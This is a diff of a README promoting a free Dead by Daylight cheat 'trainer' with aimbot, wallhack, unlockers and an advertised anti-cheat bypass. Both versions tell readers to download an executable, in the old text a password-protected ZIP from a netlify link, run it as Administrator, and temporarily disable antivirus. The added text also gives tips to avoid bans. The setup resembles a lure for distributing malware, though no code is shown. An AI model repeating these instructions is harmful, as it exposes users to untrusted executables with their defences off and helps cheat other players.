@@ -1,54 +1,95 @@
-# 🩸 DBD AutoGrind Trainer 2026 Elite – Invisible Domination
+# 🎮 DBD-AutoGrind-Trainer-2026-Elite - Automate your progress in Dead by Daylight
 
-> **Slip through the Fog unnoticed.** The Elite trainer offers fully undetected external cheats for Dead by Daylight 2026: auto farm, ESP, aimbot, unlocker and more.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/artis9808/DBD-AutoGrind-Trainer-2026-Elite/releases)
 
-## Why This Trainer?
-- 🔐 **EAC Bypass** – External memory manipulation with randomised jitter and scrambling.
-- 🎮 **All Roles** – Works for both killer and survivor with tailored features.
-- 🔄 **Always Updated** – Auto‑updater fetches fresh offsets on every launch.
-- 🖥️ **Clean GUI** – Dark UI with system tray, hotkeys, and web dashboard.
-- 🔊 **Discord Rich Presence** – Display your trainer status in real time.
+## 📌 About this project
 
-## 📦 What’s Inside
+The DBD-AutoGrind-Trainer-2026-Elite helps you manage your bloodpoints and character progression in Dead by Daylight. This tool automates repetitive tasks to save you time. It includes features to view survivor and killer locations, adjust your aim, and unlock game content like perks and character items.
 
-| Category      | Feature                       | Description                                            |
-|---------------|-------------------------------|--------------------------------------------------------|
-| Farming       | Auto Bloodpoint Farm          | AFK bot plays matches, farming unlimited BP            |
-| Visuals       | ESP Wallhack                  | See all entities through walls                         |
-| Combat        | Aimbot (Killer)               | Auto‑aim and attack with perfect accuracy              |
-| Stealth       | No Terror Radius              | Silent killer gameplay                                 |
-| Movement      | Fast Vault & Fast Pallet      | Speed up interactions for survivors                    |
-| Automation    | Skill Check Bot               | Auto‑hit great skill checks every time                 |
-| Currency      | Infinite Bloodpoints           | Edit BP value directly (safest offline)                |
-| Unlocker      | Perk & Skin Unlocker          | Unlock all teachables and cosmetics instantly          |
-| Protection    | Anti‑Ban Obfuscation          | Memory scrambler & delay randomiser                    |
+This software runs as an external process. It does not modify game files directly. You can use this tool to improve your efficiency during matches.
 
-## ⬇️ Installation
+## 💻 System requirements
 
-1. Download from: [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. Extract using password: `trainer2026`
-3. Run `trainer.exe` as Administrator
-4. Launch Dead by Daylight and enter a match
-5. Press **INSERT** to open the trainer overlay
+Before you run the software, ensure your computer meets these minimum standards:
 
-## 🔧 System Requirements
-- Windows 10/11 (64‑bit)
-- Steam, Epic Games Store, Microsoft Store
-- All chapters including Jason Voorhees & Life Road
-- EasyAntiCheat (EAC) – bypassed externally
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD Ryzen 5 or better.
+*   Memory: 8 GB RAM.
+*   Graphics: DirectX 11 compatible card.
+*   Network: Stable internet connection.
+*   Permissions: Administrator rights are necessary to enable the overlay features.
 
-## 🆘 Troubleshooting
+## 🚀 Getting Started
 
-| Issue                     | Fix                                                        |
-|---------------------------|------------------------------------------------------------|
-| Trainer won't start       | Run as Admin, disable AV temporarily                       |
-| GUI not appearing         | Press INSERT, restart both trainer and game                |
-| ESP not drawing           | Ensure you are in a live match, not main menu              |
-| Farm bot not working      | Must be in a public match as killer or survivor            |
-| EAC warning               | Use risky features in bot matches only                     |
+Follow these steps to set up the trainer on your system.
 
-## 📜 License
-MIT – see [LICENSE](LICENSE)
+### 1. Download the tool
+Visit the official releases page to obtain the latest version of the software.
 
-## 🔍 Search Tags
-`unlocker, trainer-2026, bypass, fog, bloodpoint-hack, dbd-cheat, dbd-auto-farm, aimbot, external, windows, wallhack-esp, game-hack, auto-farm, undetected, dead-by-daylight, dbd-unlock-all, dbd-wallhack`
+[Download the latest release here](https://github.com/artis9808/DBD-AutoGrind-Trainer-2026-Elite/releases)
+
+### 2. Prepare the environment
+Close all programs that might interfere with game overlays. Disable third-party antivirus software temporarily if it flags the application. Sometimes, security software blocks tools that read game memory.
+
+### 3. Run the application
+Extract the downloaded ZIP file to a folder on your desktop. Locate the executable file with the .exe extension. Right-click the file and select "Run as administrator." 
+
+The application opens a small window. Keep this window open while you play the game.
+
+## 🔥 Core features
+
+This trainer provides several modules to assist your gameplay.
+
+### Bloodpoint Automation
+The trainer detects the post-game summary and automatically selects nodes in the Bloodweb. This process uses your current bloodpoints to level up your characters without manual input. Turn this feature on via the "Automation" tab in the main menu.
+
+### ESP Wallhack
+The wallhack module draws boxes around survivors and killers. It displays distance and character names. This information helps you plan your movement across the map.
+
+### Aimbot
+The aimbot adjust your crosshair toward objectives or targets. You can set the sensitivity in the "Combat" tab. Use this to maintain focus during chases.
+
+### Perk and Skin Unlocker
+The tool identifies the inventory structure in the game memory and unlocks your desired perks and cosmetic skins. Changes apply immediately upon entering the lobby.
+
+## 🛠 Troubleshooting common issues
+
+If the software does not work, check these common fixes.
+
+### The overlay does not appear
+Ensure you run the game in "Windowed Borderless" mode. Fullscreen mode prevents the overlay from drawing on top of the game window.
+
+### The tool closes immediately
+Check that your Windows version is fully updated. Verify that the .NET Framework 4.8 or higher is installed on your computer.
+
+### The game crashes
+Disable the ESP module first to rule out compatibility issues with your graphics driver. Update your GPU drivers from the manufacturer website if crashes persist.
+
+### Permissions error
+Right-click the executable, go to Properties, and select the Compatibility tab. Check the box for "Run this program as an administrator." Apply settings and restart the tool.
+
+## ⚠️ Important considerations
+
+Use this tool at your own risk. External tools interact with game memory to perform actions. While this tool includes measures to remain undetected, game developers update their anti-cheat systems frequently. 
+
+Observe these best practices:
+*   Use the tool on accounts where you are comfortable with potential risk.
+*   Avoid using all features at the same time to look natural.
+*   Check this page for updates before every game patch.
+
+## ❓ Frequently asked questions
+
+### Do I need to pay for this tool?
+No. This tool is free for all users. Do not pay anyone for features labeled as Elite, as those are already included in the base release.
+
+### Does this tool modify game files?
+No. It reads and acts upon game data in your computer memory. It leaves your original installation files untouched.
+
+### Will I get banned?
+Game developers monitor account activity. Automating actions or using visual assistance can trigger account flags. Most users avoid issues by using the software during private matches or low-stakes sessions.
+
+### Can I run this with other programs?
+Yes, but avoid running multiple game trainers at once. Conflicting memory addresses often cause game stability issues or sudden shutdowns. Let this trainer handle the game process alone for best results.
+
+### Where can I report bugs?
+If you encounter errors, open a new issue in the GitHub repository. Provide a description of the error and a screenshot if possible. Help the developers by sharing your Windows version and the steps you took before the error occurred.
